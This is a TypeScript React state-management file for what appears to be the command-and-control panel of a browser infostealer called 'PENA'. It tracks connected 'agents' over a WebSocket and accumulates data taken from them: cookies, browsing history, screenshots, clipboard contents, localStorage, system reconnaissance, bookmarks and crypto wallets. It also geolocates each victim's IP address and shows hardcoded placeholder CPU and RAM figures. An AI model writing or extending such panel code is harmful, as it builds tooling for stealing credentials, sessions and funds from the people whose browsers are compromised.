import React, { createContext, useContext, useReducer, useEffect, ReactNode } from 'react';

interface AgentOverview {
  status: string;
  lastPing: string;
  cpuLoad: string;
  ramUsage: string;
  hostname: string;
  os: string;
  browser: string;
  ipAddress: string;
  commands: Array<{
    time: string;
    command: string;
  }>;
}

interface AgentData {
  overview: AgentOverview | null;
  cookies: any[] | null;
  history: any[] | null;
  screenshots: any[] | null;
  clipboard: any[] | null;
  dom: any | null;
  localStorage: any | null;
  systemRecon: any | null;
  bookmarks: any | null;
  wallets: any[] | null;
}

interface AgentInfo {
  uid: string;
  host: string;
  lastSeen: string;
  status: 'online' | 'offline';
  systemInfo?: any;
}

interface AgentDataState {
  agents: Record<string, AgentInfo>;
  agentData: Record<string, AgentData>;
  selectedAgent: string | null;
  connectionStatus: 'connected' | 'connecting' | 'disconnected';
  errors: Record<string, string>;
}

type AgentDataAction = 
  | { type: 'SET_AGENTS'; payload: Record<string, AgentInfo> }
  | { type: 'ADD_AGENT'; payload: AgentInfo }
  | { type: 'SELECT_AGENT'; payload: string }
  | { type: 'UPDATE_AGENT_DATA'; payload: { agentUID: string; section: string; data: any } }
  | { type: 'SET_ERROR'; payload: { agentUID: string; section: string; error: string } }
  | { type: 'SET_CONNECTION_STATUS'; payload: 'connected' | 'connecting' | 'disconnected' }
  | { type: 'CLEAR_ERROR'; payload: { agentUID: string; section: string } }
  | { type: 'UPDATE_AGENT_STATUS'; payload: { uid: string; status: 'online' | 'offline'; lastSeen: string } }
  | { type: 'RENAME_AGENT'; payload: { oldUID: string; newUID: string } }
  | { type: 'DELETE_AGENT'; payload: string };

const STORAGE_KEY = 'pena_agent_data';
const AGENT_TIMEOUT_MS = 30000; // 30 секунд без активности = offline

// Функция для сохранения в localStorage
const saveToStorage = (state: AgentDataState) => {
  try {
    const dataToSave = {
      agents: state.agents,
      agentData: state.agentData,
      selectedAgent: state.selectedAgent
    };
    localStorage.setItem(STORAGE_KEY, JSON.stringify(dataToSave));
    console.log('💾 Saved to localStorage:', dataToSave);
  } catch (error) {
    console.error('❌ Failed to save to localStorage:', error);
  }
};

// Функция для загрузки из localStorage
const loadFromStorage = (): Partial<AgentDataState> => {
  try {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (saved) {
      const parsed = JSON.parse(saved);
      console.log('📂 Loaded from localStorage:', parsed);
      return parsed;
    }
  } catch (error) {
    console.error('❌ Failed to load from localStorage:', error);
  }
  return {};
};

const initialState: AgentDataState = {
  agents: {},
  agentData: {},
  selectedAgent: null,
  connectionStatus: 'disconnected',
  errors: {},
  ...loadFromStorage() // Восстанавливаем данные при инициализации
};

function agentDataReducer(state: AgentDataState, action: AgentDataAction): AgentDataState {
  let newState: AgentDataState;
  
  switch (action.type) {
    case 'SET_AGENTS':
      newState = { ...state, agents: action.payload };
      break;
    
    case 'ADD_AGENT':
      console.log('🔥 ADD_AGENT:', action.payload);
      
      // Проверяем, существует ли агент уже
      const existingAgentData = state.agentData[action.payload.uid];
      
      newState = {
        ...state,
        agents: { ...state.agents, [action.payload.uid]: action.payload },
        agentData: {
          ...state.agentData,
          [action.payload.uid]: existingAgentData || {
            // Создаем данные только если агента еще нет
            overview: null,
            cookies: [],
            history: [],
            screenshots: [],
            clipboard: [],
            dom: null,
            localStorage: null,
            systemRecon: null,
            bookmarks: null,
            wallets: []
          }
        }
      };
      break;
    
    case 'SELECT_AGENT':
      console.log('🎯 SELECT_AGENT:', action.payload);
      newState = { ...state, selectedAgent: action.payload };
      break;
    
    case 'UPDATE_AGENT_DATA':
      const { agentUID, section, data } = action.payload;
      console.log(`📊 UPDATE_AGENT_DATA: Agent=${agentUID}, Section=${section}, DataType=${typeof data}, DataLength=${Array.isArray(data) ? data.length : 'not array'}`);
      console.log('📊 Data content:', data);
      
      const currentAgentData = state.agentData[agentUID] || {
        overview: null,
        cookies: [],
        history: [],
        screenshots: [],
        clipboard: [],
        dom: null,
        localStorage: null,
        systemRecon: null,
        bookmarks: null,
        wallets: []
      };

      let updatedSectionData;
      const sectionKey = section.toLowerCase();

      // Для массивов - накапливаем данные, для объектов - заменяем
      if (Array.isArray(data) && Array.isArray(currentAgentData[sectionKey])) {
        // Накапливаем массивы (cookies, history, screenshots, clipboard, wallets)
        const existingData = currentAgentData[sectionKey] || [];
        
        if (sectionKey === 'cookies') {
          // Для кукис - объединяем по уникальному ключу (domain + name)
          const existingCookies = existingData;
          const newCookies = data.filter(newCookie => 
            !existingCookies.some(existing => 
              existing.domain === newCookie.domain && existing.name === newCookie.name
            )
          );
          updatedSectionData = [...existingCookies, ...newCookies];
        } else if (sectionKey === 'history') {
          // Для истории - объединяем по уникальному URL + timestamp
          const existingHistory = existingData;
          const newHistory = data.filter(newItem => 
            !existingHistory.some(existing => 
              existing.url === newItem.url && existing.lastVisitTime === newItem.lastVisitTime
            )
          );
          updatedSectionData = [...existingHistory, ...newHistory];
        } else if (sectionKey === 'screenshots') {
          // Для скриншотов - объединяем по filename
          const existingScreenshots = existingData;
          const newScreenshots = data.filter(newScreenshot => 
            !existingScreenshots.some(existing => 
              existing.filename === newScreenshot.filename
            )
          );
          updatedSectionData = [...existingScreenshots, ...newScreenshots];
        } else {
          // Для остальных массивов - просто добавляем новые элементы
          updatedSectionData = [...existingData, ...data];
        }
        
        console.log(`📊 Accumulated ${sectionKey}: ${existingData.length} existing + ${data.length} new = ${updatedSectionData.length} total`);
      } else {
        // Для не-массивов (overview, dom, localStorage, systemRecon, bookmarks) - заменяем
        updatedSectionData = data;
        console.log(`📊 Replaced ${sectionKey} with new data`);
      }
      
      newState = {
        ...state,
        agentData: {
          ...state.agentData,
          [agentUID]: {
            ...currentAgentData,
            [sectionKey]: updatedSectionData
          }
        }
      };
      
      console.log(`📊 After update - Agent ${agentUID} ${section}:`, newState.agentData[agentUID]?.[sectionKey]);
      break;

    case 'UPDATE_AGENT_STATUS':
      console.log('🔄 UPDATE_AGENT_STATUS:', action.payload);
      newState = {
        ...state,
        agents: {
          ...state.agents,
          [action.payload.uid]: {
            ...state.agents[action.payload.uid],
            status: action.payload.status,
            lastSeen: action.payload.lastSeen
          }
        }
      };
      break;
    
    case 'SET_ERROR':
      console.log('❌ SET_ERROR:', action.payload);
      newState = {
        ...state,
        errors: {
          ...state.errors,
          [`${action.payload.agentUID}_${action.payload.section}`]: action.payload.error
        }
      };
      break;
    
    case 'CLEAR_ERROR':
      const errorKey = `${action.payload.agentUID}_${action.payload.section}`;
      const { [errorKey]: removed, ...remainingErrors } = state.errors;
      newState = { ...state, errors: remainingErrors };
      break;
    
    case 'SET_CONNECTION_STATUS':
      console.log('🔌 SET_CONNECTION_STATUS:', action.payload);
      newState = { ...state, connectionStatus: action.payload };
      break;
    
    case 'RENAME_AGENT':
      console.log('✏️ RENAME_AGENT:', action.payload);
      const { oldUID, newUID } = action.payload;
      
      // Создаем новые объекты без старого UID
      const { [oldUID]: removedAgent, ...restAgents } = state.agents;
      const { [oldUID]: removedData, ...restData } = state.agentData;
      
      // Добавляем с новым UID
      const updatedAgent = { ...removedAgent, uid: newUID };
      
      newState = {
        ...state,
        agents: { ...restAgents, [newUID]: updatedAgent },
        agentData: { ...restData, [newUID]: removedData },
        selectedAgent: state.selectedAgent === oldUID ? newUID : state.selectedAgent
      };
      break;

    case 'DELETE_AGENT':
      console.log('🗑️ DELETE_AGENT:', action.payload);
      const uidToDelete = action.payload;
      
      const { [uidToDelete]: deletedAgent, ...remainingAgents } = state.agents;
      const { [uidToDelete]: deletedData, ...remainingData } = state.agentData;
      
      // Очищаем связанные ошибки
      const clearedErrors = Object.keys(state.errors).reduce((acc, key) => {
        if (!key.startsWith(`${uidToDelete}_`)) {
          acc[key] = state.errors[key];
        }
        return acc;
      }, {} as Record<string, string>);
      
      newState = {
        ...state,
        agents: remainingAgents,
        agentData: remainingData,
        errors: clearedErrors,
        selectedAgent: state.selectedAgent === uidToDelete ? null : state.selectedAgent
      };
      break;
    
    default:
      newState = state;
  }

  // Сохраняем в localStorage после каждого изменения (кроме ошибок и статуса соединения)
  if (action.type !== 'SET_ERROR' && action.type !== 'CLEAR_ERROR' && action.type !== 'SET_CONNECTION_STATUS') {
    saveToStorage(newState);
  }

  return newState;
}

interface AgentDataContextType {
  state: AgentDataState;
  selectAgent: (agentUID: string) => void;
  getAgentData: (agentUID: string, section: string) => any;
  hasError: (agentUID: string, section: string) => string | null;
  renameAgent: (oldUID: string, newUID: string) => void;
  deleteAgent: (uid: string) => void;
}

const AgentDataContext = createContext<AgentDataContextType | undefined>(undefined);

export const useAgentData = () => {
  const context = useContext(AgentDataContext);
  if (!context) {
    throw new Error('useAgentData must be used within AgentDataProvider');
  }
  return context;
};

interface AgentDataProviderProps {
  children: ReactNode;
}

export const AgentDataProvider: React.FC<AgentDataProviderProps> = ({ children }) => {
  const [state, dispatch] = useReducer(agentDataReducer, initialState);

  // Функция для проверки и обновления статусов агентов
  const checkAgentStatuses = () => {
    const now = Date.now();
    Object.values(state.agents).forEach(agent => {
      if (agent.status === 'online') {
        const lastSeenTime = new Date(agent.lastSeen).getTime();
        if (now - lastSeenTime > AGENT_TIMEOUT_MS) {
          console.log(`⏰ Agent ${agent.uid} timeout, setting to offline`);
          dispatch({
            type: 'UPDATE_AGENT_STATUS',
            payload: {
              uid: agent.uid,
              status: 'offline',
              lastSeen: agent.lastSeen
            }
          });
        }
      }
    });
  };

  useEffect(() => {
    // Проверяем статусы агентов каждые 10 секунд
    const statusInterval = setInterval(checkAgentStatuses, 10000);
    
    return () => {
      clearInterval(statusInterval);
    };
  }, [state.agents]);

  useEffect(() => {
    let ws: WebSocket | null = null;
    let reconnectTimeout: NodeJS.Timeout | null = null;

    const connectWebSocket = () => {
      dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connecting' });
      console.log('🔌 Connecting to PENA backend on ws://localhost:5000/pena');

      try {
        ws = new WebSocket('ws://localhost:5000/pena');

        ws.onopen = () => {
          console.log('✅ Connected to PENA backend');
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connected' });
          
          if (reconnectTimeout) {
            clearTimeout(reconnectTimeout);
            reconnectTimeout = null;
          }
        };

        ws.onmessage = (event) => {
          try {
            const message = JSON.parse(event.data);
            console.log('📨 WS received:', message);

            switch (message.type) {
              case 'agent_connect':
                console.log('🤖 Processing agent_connect');
                if (message.data) {
                  // Получаем реальный IP и информацию о стране
                  const realIP = message.data.systemInfo?.ipAddress || message.data.systemInfo?.ip || '127.0.0.1';
                  const country = message.data.systemInfo?.country || message.data.systemInfo?.countryName || 'Unknown';
                  const countryCode = message.data.systemInfo?.countryCode || message.data.systemInfo?.country_code || '';
                  
                  // Получаем флаг по коду страны
                  let countryFlag = '🌍';
                  if (countryCode && countryCode.length === 2) {
                    // Конвертируем код страны в emoji флага
                    const codePoints = countryCode
                      .toUpperCase()
                      .split('')
                      .map(char => 127397 + char.charCodeAt(0));
                    countryFlag = String.fromCodePoint(...codePoints);
                  } else if (country && country !== 'Unknown') {
                    // Карта популярных стран для флагов
                    const countryFlags = {
                      'Russia': '🇷🇺',
                      'Russian Federation': '🇷🇺',
                      'United States': '🇺🇸',
                      'USA': '🇺🇸',
                      'Ukraine': '🇺🇦',
                      'Germany': '🇩🇪',
                      'France': '🇫🇷',
                      'United Kingdom': '🇬🇧',
                      'UK': '🇬🇧',
                      'China': '🇨🇳',
                      'Japan': '🇯🇵',
                      'Canada': '🇨🇦',
                      'Australia': '🇦🇺',
                      'Brazil': '🇧🇷',
                      'India': '🇮🇳'
                    };
                    countryFlag = countryFlags[country] || '🌍';
                  }
                  
                  const hostDisplay = `${realIP} ${countryFlag} ${country}`;

                  const agentInfo: AgentInfo = {
                    uid: message.data.uid,
                    host: hostDisplay,
                    lastSeen: message.data.lastSeen || new Date().toLocaleString(),
                    status: 'online',
                    systemInfo: message.data.systemInfo
                  };
                  
                  dispatch({ type: 'ADD_AGENT', payload: agentInfo });
                  
                  if (message.data.systemInfo) {
                    const overviewData = {
                      status: 'ONLINE',
                      lastPing: agentInfo.lastSeen,
                      cpuLoad: '23.4%',
                      ramUsage: '1.2GB / 8.0GB',
                      hostname: message.data.systemInfo.hostname || 'Unknown',
                      os: message.data.systemInfo.os || 'Unknown OS',
                      browser: message.data.systemInfo.browser || 'Chrome',
                      ipAddress: realIP,
                      commands: [
                        { time: new Date().toLocaleTimeString(), command: `agent_connect(uid="${message.data.uid}")` }
                      ]
                    };

                    dispatch({
                      type: 'UPDATE_AGENT_DATA',
                      payload: {
                        agentUID: message.data.uid,
                        section: 'overview',
                        data: overviewData
                      }
                    });
                  }
                }
                break;

              case 'update_data':
                console.log('📊 Processing update_data');
                if (message.agentUID && message.section && message.data) {
                  console.log(`📊 Updating ${message.section} for agent ${message.agentUID}`);
                  console.log('📊 Raw data received:', message.data);
                  
                  dispatch({
                    type: 'UPDATE_AGENT_DATA',
                    payload: {
                      agentUID: message.agentUID,
                      section: message.section,
                      data: message.data
                    }
                  });

                  // Обновляем время последней активности агента
                  dispatch({
                    type: 'UPDATE_AGENT_STATUS',
                    payload: {
                      uid: message.agentUID,
                      status: 'online',
                      lastSeen: new Date().toLocaleString()
                    }
                  });
                } else {
                  console.log('❌ Invalid update_data message:', message);
                }
                break;

              default:
                console.log('❓ Unknown message type:', message.type);
            }
          } catch (error) {
            console.error('❌ Error parsing WebSocket message:', error);
          }
        };

        ws.onclose = () => {
          console.log('🔌 WebSocket connection closed. Attempting to reconnect...');
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
          
          reconnectTimeout = setTimeout(() => {
            connectWebSocket();
          }, 5000);
        };

        ws.onerror = (error) => {
          console.error('❌ WebSocket error:', error);
          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
        };

      } catch (error) {
        console.error('❌ Failed to create WebSocket connection:', error);
        dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
        
        reconnectTimeout = setTimeout(() => {
          connectWebSocket();
        }, 5000);
      }
    };

    connectWebSocket();

    return () => {
      if (reconnectTimeout) {
        clearTimeout(reconnectTimeout);
      }
      if (ws) {
        ws.close();
      }
    };
  }, []);

  const selectAgent = (agentUID: string) => {
    console.log('🎯 selectAgent called with:', agentUID);
    dispatch({ type: 'SELECT_AGENT', payload: agentUID });
  };

  const renameAgent = (oldUID: string, newUID: string) => {
    console.log('✏️ renameAgent called:', { oldUID, newUID });
    dispatch({ type: 'RENAME_AGENT', payload: { oldUID, newUID } });
  };

  const deleteAgent = (uid: string) => {
    console.log('🗑️ deleteAgent called:', uid);
    dispatch({ type: 'DELETE_AGENT', payload: uid });
  };

  const getAgentData = (agentUID: string, section: string) => {
    const data = state.agentData[agentUID]?.[section.toLowerCase()] || null;
    console.log(`📊 getAgentData(${agentUID}, ${section}):`, data);
    return data;
  };

  const hasError = (agentUID: string, section: string) => {
    return state.errors[`${agentUID}_${section}`] || null;
  };

  return (
    <AgentDataContext.Provider value={{ 
      state, 
      selectAgent, 
      getAgentData, 
      hasError, 
      renameAgent, 
      deleteAgent 
    }}>
      {children}
    </AgentDataContext.Provider>
  );
};
